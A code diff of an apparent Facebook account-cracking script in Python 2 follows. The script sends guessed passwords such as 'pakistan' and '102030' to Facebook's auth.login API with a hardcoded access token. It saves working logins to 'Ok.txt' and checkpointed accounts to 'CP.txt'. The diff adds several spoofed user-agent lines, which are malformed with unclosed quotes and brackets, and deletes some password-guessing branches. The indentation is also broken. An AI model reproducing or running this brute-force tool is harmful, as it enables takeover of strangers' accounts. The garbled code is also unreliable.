@@ -50,7 +50,11 @@ br = mechanize.Browser()
 br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
 br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
- 
+br.addheaders = [('Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
+br.addheaders = [('Mozilla/5.0 (Linux; Android 9; TA-1021 Build/PKQ1.181105.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.4147.111 Mobile Safari/537.36 Instagram 153.0.0.34.96 Android (28/9; 480dpi; 1080x1920; HMD Global/Nokia; TA-1021; PLE; qcom; ru_RU; 236572377"
+br.addheaders = [('Mozilla/5.0 (Linux; Android 5.1; VIVO Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36"
+br.addheaders = [('Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36"
+br.addheaders = [('Mozilla/5.0 (Linux; Android 9; Nokia 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Mobile Safari/537.36"
 def exb():
     print '[!] Exit Successfully '
     os.sys.exit()
@@ -216,39 +220,8 @@ def action():
                         cps.write(k + c + user + pass3 + '\n')
                         cps.close()
                         cpb.append(c + user + pass3)
-                      else:
-                       pass4 = 'pakistan'
-                       data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-                       q = json.load(data)
-                       if 'access_token' in q:
-                        print '\x1b[1;92m  [MRD_OK]  ' + k + c + user + '  |  ' + pass4
-                        okb = open('save/Ok.txt', 'a')
-                        okb.write(k + c + user + pass3 + '\n')
-                        okb.close()
-                        oks.append(c + user + pass3)
-                     elif 'www.facebook.com' in q['error_msg']:
-                          print '\x1b[1;91m  [MRD_CP] ' + k + c + user + '  |  ' + pass4
-                          cps = open('save/CP.txt', 'a')
-                          cps.write(k + c + user + pass4 + '\n')
-                          cps.close()
-                          cpb.append(c + user + pass4)
-                       else:
-                         pass5 = '102030'
-                         data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-                         q = json.load(data)
-                        if 'access_token' in q:
-                         print '\x1b[1;92m  [MRD_OK]  ' + k + c + user + '  |  ' + pass5
-                         okb = open('save/Ok.txt', 'a')
-                         okb.write(k + c + user + pass5 + '\n')
-                         okb.close()
-                         oks.append(c + user + pass3)
-                     elif 'www.facebook.com' in q['error_msg']:
-                         print '\x1b[1;91m  [MRD_CP] ' + k + c + user + '  |  ' + pass5
-                         cps = open('save/CP.txt', 'a')
-                         cps.write(k + c + user + pass5 + '\n')
-                         cps.close()
-                         cpb.append(c + user + pass5)
-                                
+                      
+                                                   
         except:
             pass
  
